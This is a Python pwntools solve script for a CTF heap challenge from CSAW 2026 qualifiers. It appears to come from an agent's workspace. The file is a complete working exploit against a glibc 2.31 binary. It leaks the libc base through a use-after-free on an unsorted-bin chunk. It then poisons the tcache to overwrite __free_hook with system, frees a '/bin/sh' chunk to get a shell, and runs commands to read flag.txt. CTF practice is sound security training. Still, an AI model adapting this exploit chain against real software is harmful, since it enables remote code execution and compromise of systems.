#!/usr/bin/env python3
"""Hells Bells (CSAW CTF 2026 Quals) — UAF leak + tcache poison of __free_hook.

glibc 2.31: no safe-linking, __free_hook still present.

Usage:
    python3 solve.py                  # local patched binary + bundled libc
    python3 solve.py HOST:PORT        # remote
    python3 solve.py HOST PORT
"""
from __future__ import annotations

import os
import re
import sys

from pwn import ELF, context, log, p64, process, remote, u64

context.arch = "amd64"
context.log_level = "info"

HERE = os.path.dirname(os.path.abspath(__file__))


def find_dir() -> str:
    candidates = [
        HERE,
        os.path.join(HERE, "extracted", "files"),
        os.path.join(HERE, "..", "agent_workspace"),
        os.path.join(HERE, "..", "extracted", "files"),
    ]
    for path in candidates:
        path = os.path.normpath(path)
        libc_p = os.path.join(path, "libc-2.31.so")
        for bin_name in ("thermite-charge-patched", "thermite-charge"):
            if os.path.isfile(os.path.join(path, bin_name)) and os.path.isfile(libc_p):
                return path, os.path.join(path, bin_name)
    raise SystemExit("thermite-charge / libc-2.31.so not found next to solve.py")


FILES, BIN = find_dir()
libc = ELF(os.path.join(FILES, "libc-2.31.so"), checksec=False)


def plant(io, slot: int, size: int, data: bytes) -> None:
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"): ", str(slot).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"payload: ", data)


def defuse(io, slot: int) -> None:
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"slot: ", str(slot).encode())


def rewire(io, slot: int, data: bytes) -> None:
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.sendafter(b"payload: ", data)


def inspect(io, slot: int, size: int) -> bytes:
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.recvuntil(b"payload: ")
    return io.recv(size, timeout=5)


def connect():
    args = sys.argv[1:]
    if not args or args[0] in {"local", "LOCAL"}:
        log.info("local process %s", BIN)
        return process(BIN)
    target = args[0]
    if ":" in target:
        host, port = target.rsplit(":", 1)
        return remote(host, int(port))
    if len(args) >= 2:
        return remote(args[0], int(args[1]))
    raise SystemExit("usage: solve.py [local | HOST:PORT | HOST PORT]")


def extract_flag(text: str) -> str | None:
    for pat in (r"csaw\{[^}]+\}", r"csawctf\{[^}]+\}", r"flag\{[^}]+\}"):
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(0)
    return None


def main() -> None:
    io = connect()
    banner = io.recvuntil(b"> ", timeout=15)
    if b"Thermite Charge Inventory" not in banner:
        log.failure("unexpected banner")
        print(banner[:300])
        io.close()
        sys.exit(2)
    # put '>' back for sendlineafter
    io.unrecv(b"> ")

    log.info("unsorted-bin leak")
    plant(io, 0, 0x500, b"A" * 0x500)
    plant(io, 1, 0x20, b"B" * 0x20)
    defuse(io, 0)
    leak = u64(inspect(io, 0, 0x500)[:8])
    log.info("unsorted fd = %s", hex(leak))
    base = leak - libc.symbols["__malloc_hook"] - 0x10 - 96
    if base & 0xFFF:
        log.failure("libc base not page-aligned: %s", hex(base))
        io.close()
        sys.exit(1)
    libc.address = base
    try:
        binsh = next(libc.search(b"/bin/sh\x00"))
    except StopIteration:
        log.failure("base does not resolve /bin/sh")
        io.close()
        sys.exit(1)
    log.success(
        "libc %s  system %s  /bin/sh %s",
        hex(base),
        hex(libc.symbols["system"]),
        hex(binsh),
    )

    log.info("tcache poison -> __free_hook")
    sz = 0x30
    plant(io, 2, sz, b"C" * sz)
    plant(io, 3, sz, b"D" * sz)
    defuse(io, 3)
    defuse(io, 2)
    rewire(io, 2, p64(libc.symbols["__free_hook"]) + b"\x00" * (sz - 8))
    plant(io, 4, sz, b"E" * sz)
    plant(io, 5, sz, p64(libc.symbols["system"]) + b"\x00" * (sz - 8))

    log.info("trigger system(/bin/sh)")
    plant(io, 6, sz, b"/bin/sh\x00" + b"\x00" * (sz - 8))
    defuse(io, 6)

    io.sendline(b"echo SHELL_OK; id; cat flag.txt")
    out = io.recvrepeat(4)
    text = out.decode("utf-8", "replace")
    print(text)
    flag = extract_flag(text)
    if flag:
        log.success("FLAG %s", flag)
        with open(os.path.join(HERE, "flag.txt"), "w") as fh:
            fh.write(flag + "\n")
    elif b"SHELL_OK" in out:
        log.success("shell confirmed (no flag.txt on this run)")
    else:
        log.failure("no shell")
        io.close()
        sys.exit(2)
    io.close()


if __name__ == "__main__":
    main()
